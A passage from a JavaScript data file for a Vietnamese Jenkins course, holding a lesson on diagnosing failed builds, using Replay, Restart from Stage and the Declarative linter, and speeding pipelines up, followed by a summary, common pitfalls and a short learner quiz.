        options: ["Là giao diện mặc định mới của Jenkins", "Đã bị deprecate từ 7/2026, không còn nhận bản vá bảo mật", "Chỉ có trong bản trả phí", "Đã được gộp vào Jenkins core"],
        answer: 1,
        explain: "Theo tài liệu Jenkins, Blue Ocean bị deprecate từ 7/2026; Pipeline Graph View là lựa chọn được bảo trì."
      }
    ]
  },
  "p08.m6.t10": {
    videos: [
      { id: "VzJA3ciqKkU", title: "What Does Replay Do in Jenkins?", channel: "CloudBeesTV", lang: "en", minutes: 4, embed: true },
      { id: "-7POl-vMLCQ", title: "How To Restart a Jenkins Pipeline From a Stage", channel: "CloudBeesTV", lang: "en", minutes: 3, embed: true }
    ],
    sections: [
      {
        h: "Đọc lỗi nhanh",
        p: [
          "Khi build đỏ, mở Console Output và tìm từ dưới lên dòng lỗi đầu tiên có ý nghĩa, không phải dòng cuối. Pipeline Graph View cho biết stage nào lỗi và log riêng của stage đó. Các lỗi hay gặp và nguyên nhân thường là:"
        ],
        list: [
          "`script returned exit code 1`: lệnh shell thất bại; lỗi thật nằm ở vài dòng phía trên.",
          "`Still waiting to schedule task` / `There are no nodes with the label 'x'`: không có agent nào mang label đó đang online, hoặc tất cả executor đang bận.",
          "`Scripts not permitted to use method ...`: code gọi phương thức ngoài sandbox (xem bài Groovy & sandbox).",
          "`java.io.NotSerializableException`: biến giữ đối tượng không serialize được qua điểm lưu trạng thái.",
          "`No such DSL method 'xyz'`: gõ sai tên bước hoặc thiếu plugin cung cấp bước đó.",
          "`No space left on device`: agent hoặc controller đầy ổ đĩa."
        ]
      },
      {
        h: "Công cụ sửa pipeline không cần commit liên tục",
        p: [
          "Replay: trên một build đã chạy, sửa trực tiếp Jenkinsfile và chạy lại để thử, không cần commit. Sửa đúng rồi thì mới đưa vào repo. Restart from Stage: chạy lại một Declarative pipeline từ stage bị lỗi mà không chạy lại các stage trước; nếu stage đó cần file từ `stash`, bật `preserveStashes()`.",
          "Pipeline Syntax (đường dẫn `/pipeline-syntax` trong mỗi job) sinh đoạn code cho bước bất kỳ theo các plugin đang cài trên Jenkins của bạn, rất hữu ích khi không nhớ tham số. Kiểm tra cú pháp Declarative trước khi commit bằng linter của Jenkins:"
        ],
        code: {
          lang: "bash",
          file: "terminal",
          src: `# Dùng API token của bạn (User → Security → API Token)
curl -fsS -X POST --user "chien:$JENKINS_TOKEN" \\
  -F "jenkinsfile=<Jenkinsfile" \\
  https://jenkins.company.vn/pipeline-model-converter/validate`
        }
      },
      {
        h: "Làm pipeline nhanh hơn",
        list: [
          "Đo trước: xem stage nào tốn thời gian nhất trong Pipeline Graph View rồi mới tối ưu.",
          "Chạy song song các bước độc lập (`parallel`, `matrix`) nếu có đủ executor.",
          "Cache phụ thuộc: mount volume cache npm/Maven cho agent Docker, hoặc PersistentVolume cho pod; tận dụng cache layer Docker.",
          "Checkout nông (shallow clone) cho repo lớn khi không cần toàn bộ lịch sử.",
          "Gộp nhiều bước `sh` liên tiếp thành một: mỗi bước pipeline có chi phí điều phối riêng trên controller.",
          "Với pipeline build-test chạy lại được, chọn chế độ Performance-optimized ở Manage Jenkins → System → Pipeline Speed/Durability Settings (hoặc riêng cho từng job) để giảm mạnh ghi đĩa trên controller; đánh đổi là build đang chạy có thể mất trạng thái nếu Jenkins tắt đột ngột."
        ],
        p: [
          "Nếu hàng đợi thường xuyên dài, vấn đề là thiếu agent chứ không phải pipeline chậm: thêm agent hoặc chuyển sang agent Kubernetes co giãn."
        ]
      }
    ],
    summary: [
      "Tìm dòng lỗi đầu tiên có ý nghĩa; nhận diện các lỗi thường gặp như thiếu label, sandbox, NotSerializable.",
      "Replay để thử sửa, Restart from Stage để chạy lại từ chỗ hỏng, linter để kiểm tra cú pháp.",
      "Đo trước khi tối ưu: song song hoá, cache phụ thuộc, gộp bước `sh`.",
      "Hàng đợi dài thì thêm agent, không phải sửa pipeline."
    ],
    pitfalls: [
      "Sửa Jenkinsfile bằng hàng chục commit \"fix ci\" thay vì dùng Replay.",
      "Sửa bằng Replay xong quên đưa thay đổi vào repo, build sau lại lỗi như cũ.",
      "Tối ưu stage mất 10 giây trong khi stage test mất 15 phút."
    ],
    quiz: [
      {
        q: "Build báo `There are no nodes with the label 'docker'`. Nguyên nhân thường là gì?",
        options: ["Lỗi cú pháp Jenkinsfile", "Không có agent mang label `docker` đang online", "Thiếu credential registry", "Test bị lỗi"],
        answer: 1,
        explain: "Jenkins không tìm được node có label phù hợp để chạy stage. Kiểm tra agent có online và gắn đúng label không."
      },
      {
        q: "Tính năng nào cho phép sửa Jenkinsfile và chạy lại một build mà không cần commit?",
        options: ["Replay", "Rebuild", "Script Console", "Build with Parameters"],
        answer: 0,
        explain: "Replay mở trình sửa Jenkinsfile của build đó và chạy lại với nội dung đã sửa. Script Console là Groovy quản trị, không phải để sửa pipeline."
      },
      {
        q: "Hàng đợi build luôn dài vào giờ cao điểm dù từng pipeline chạy nhanh. Nên làm gì trước?",
        options: ["Viết lại Jenkinsfile bằng Scripted", "Tăng thêm agent hoặc dùng agent Kubernetes co giãn", "Tắt test", "Tăng số executor của built-in node"],
        answer: 1,
        explain: "Hàng đợi dài là dấu hiệu thiếu năng lực chạy. Tăng executor cho built-in node đưa build lên controller, trái nguyên tắc bảo mật."
      }
    ]
  },
});
